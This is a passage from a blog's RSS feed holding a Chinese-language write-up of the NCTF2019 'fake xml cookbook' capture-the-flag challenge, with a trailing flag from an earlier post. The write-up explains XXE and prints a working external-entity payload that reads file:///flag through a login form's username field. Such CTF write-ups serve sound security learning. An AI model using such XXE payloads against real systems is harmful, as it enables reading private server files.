&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>NCTF2019_Fakexml_cookbook</title>
        <link>https://anthem-whisper.github.io/p/nctf2019_fakexml_cookbook/</link>
        <pubDate>Fri, 27 Dec 2019 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/nctf2019_fakexml_cookbook/</guid>
        <description>&lt;p&gt;NCTF2019web1:fake xml cookbook_writeup&lt;/p&gt;
&lt;p&gt;By:0xfxxker_wh1sper&lt;/p&gt;
&lt;p&gt;解题思路：&lt;/p&gt;
&lt;p&gt;这道题名字是XML，关于XML我知道的只有两种手段，一是普通XML注入，通过闭合各种标签然后植入恶意代码运行脚本，但是一般这种手段实在攻击者能够掌握password字段并且能够保存到服务器当中去才能够添加一个新的admin账户（当时也在这里卡了很久），还有一种就是XXE(XML External Entity Injection) 全称为 XML 外部实体注入，利用点是外部实体，如果能注入，外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）。&lt;/p&gt;
&lt;p&gt;用户名，密码随便试一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164837.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;抓包，分析:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164848.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;于是我构造了如下XML外部实体，大概是这样&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164909.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;注意事项：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE dy（这里有一个空格） [
&amp;lt;!ENTITY dy SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;
]&amp;gt;
&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;dy;（分号）&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过POST请求发过去&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164914.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;服务器说登录失败，并且返回&amp;amp;dy，也就是/flag的内容&lt;/p&gt;
&lt;p&gt;这里挂一篇关于xxe的学习文档：http://url.cn/54Ucm5w&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
